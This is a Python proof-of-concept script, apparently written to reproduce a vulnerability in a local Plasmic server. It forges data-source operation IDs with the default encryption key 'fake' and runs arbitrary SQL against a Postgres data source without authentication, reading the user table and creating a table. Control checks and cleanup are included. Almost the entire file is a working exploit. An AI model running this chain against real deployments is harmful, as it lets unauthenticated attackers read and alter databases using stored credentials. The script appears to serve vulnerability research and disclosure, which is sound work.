#!/usr/bin/env python3
"""P-04 chain (Postgres variant): default op-encryption key "fake" lets an
UNAUTHENTICATED attacker forge a data-source operation ID (opId) and execute
ARBITRARY SQL (customRead/customWrite) against a Postgres data source, using
the source's stored credentials, via POST /api/v1/server-data/sources/:id/execute.

Precondition: server deployed without ~/.plasmic/secrets.json (verified on
this host: file absent), so getOpEncryptionKey() == "fake" (secrets.ts:74).

Controls: wrong-key opId -> 400 Invalid opId; the marker table must not exist
before the attack and must exist after (verified via direct psql).
Cleanup: marker table dropped at the end.
"""
import json, subprocess, sys, urllib.request, urllib.error, http.cookiejar

BASE = "http://localhost:3004"
PW = "!53kr3tz!"
U1_PROJECT = "kktvcFBzoiT11MX9o9NSiJ"
MARKER = "pwned_by_forged_opid"

def session(email):
    cj = http.cookiejar.CookieJar()
    op = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))
    csrf = json.loads(op.open(BASE + "/api/v1/auth/csrf").read())["csrf"]
    req = urllib.request.Request(BASE + "/api/v1/auth/login",
        data=json.dumps({"email": email, "password": PW}).encode(),
        headers={"Content-Type": "application/json", "x-csrf-token": csrf})
    assert json.loads(op.open(req).read()).get("status") is True
    return op, json.loads(op.open(BASE + "/api/v1/auth/csrf").read())["csrf"]

def call(opener, method, path, body=None, csrf=None):
    headers = {"Content-Type": "application/json"}
    if csrf: headers["x-csrf-token"] = csrf
    req = urllib.request.Request(BASE + path,
        data=json.dumps(body).encode() if body is not None else None,
        headers=headers, method=method)
    try:
        with opener.open(req) as r: return r.status, json.loads(r.read() or b"{}")
    except urllib.error.HTTPError as e:
        try: return e.code, json.loads(e.read() or b"{}")
        except Exception: return e.code, {}

def forge(key, template):
    out = subprocess.run(["node", "forge_opid.mjs", key, json.dumps(template)],
                         capture_output=True, text=True,
                         cwd="/home/hatch/workspace/plasmic-cve-hunt/live-repro")
    return out.stdout.strip()

def psql(sql):
    out = subprocess.run(["psql", "-h", "localhost", "-U", "wab", "-d", "wab", "-Atc", sql],
                         env={"PATH": "/usr/bin:/bin", "PGPASSWORD": "SEKRET"},
                         capture_output=True, text=True)
    return out.stdout.strip()

results = []
op1, csrf1 = session("user@example.com")
anon = urllib.request.build_opener()

psql(f"drop table if exists {MARKER}")
results.append(("precondition-marker-absent", psql(
    f"select count(*) from information_schema.tables where table_name='{MARKER}'") == "0"))

# SETUP (owner): postgres data source pointing at the local wab database
st, ds = call(op1, "POST", "/api/v1/data-source/sources",
              {"name": "hunt-pg", "source": "postgres",
               "settings": {"host": "localhost", "port": "5432", "name": "wab", "user": "wab"},
               "credentials": {"password": "SEKRET"}}, csrf1)
ds_id = ds.get("id")
print(f"[setup] create postgres data source -> {st}, id={ds_id}")
assert ds_id, json.dumps(ds)[:300]
results.append(("setup-datasource", st == 200))
st, r = call(op1, "POST", f"/api/v1/data-source/sources/{ds_id}/allow",
             {"projectId": U1_PROJECT}, csrf1)
print(f"[setup] allow project -> {st}")

# CONTROL A: issue a LEGIT opId through the owner's studio endpoint and run it
# unauthenticated — this is the intended public data plane (contrast for the attack).
st, r = call(op1, "POST", f"/api/v1/data-source/sources/{ds_id}/op-id",
             {"projectId": U1_PROJECT, "name": "customRead",
              "templates": {"query": "select 1 as legit"}}, csrf1)
legit_opid = r.get("opId")
print(f"[control] owner-issued opId -> {st}: {str(legit_opid)[:40]}")
st, r = call(anon, "POST", f"/api/v1/server-data/sources/{ds_id}/execute",
             {"opId": legit_opid, "userArgs": {}})
print(f"[control] anon execute legit opId -> {st}: {json.dumps(r)[:200]}")
results.append(("control-legit-opid-executes", st == 200 and "legit" in json.dumps(r)))

# CONTROL B: wrong-key forged opId must be rejected
bad = forge("not-the-key", {"name": "customRead", "templates": {"query": "select 1 as x"}})
st, r = call(anon, "POST", f"/api/v1/server-data/sources/{ds_id}/execute",
             {"opId": bad, "userArgs": {}})
print(f"[control] anon execute wrong-key opId -> {st}: {json.dumps(r)[:140]}")
results.append(("control-wrong-key-rejected", st == 400 and "Invalid opId" in json.dumps(r)))

# ATTACK 1 (read): forged opId, customRead arbitrary SQL — read the user table count
forged_read = forge("fake", {"name": "customRead",
    "templates": {"query": "select count(*)::int as user_count from \"user\""}})
st, r = call(anon, "POST", f"/api/v1/server-data/sources/{ds_id}/execute",
             {"opId": forged_read, "userArgs": {}})
print(f"[attack1] anon forged customRead -> {st}: {json.dumps(r)[:240]}")
results.append(("attack-forged-read-executes",
                st == 200 and "user_count" in json.dumps(r)))

# ATTACK 2 (write): forged opId, customWrite — create a marker table
forged_write = forge("fake", {"name": "customWrite",
    "templates": {"query": f"create table {MARKER} (id int, note text)"}})
st, r = call(anon, "POST", f"/api/v1/server-data/sources/{ds_id}/execute",
             {"opId": forged_write, "userArgs": {}})
print(f"[attack2] anon forged customWrite -> {st}: {json.dumps(r)[:200]}")
exists = psql(f"select count(*) from information_schema.tables where table_name='{MARKER}'") == "1"
print(f"[verify] marker table exists in DB after forged write: {exists}")
results.append(("attack-forged-write-persisted", st == 200 and exists))

psql(f"drop table if exists {MARKER}")
print("\n== SUMMARY ==")
ok = True
for name, passed in results:
    print(f"  {'PASS' if passed else 'FAIL'}  {name}"); ok = ok and passed
print(f"data_source_id={ds_id}")
sys.exit(0 if ok else 1)
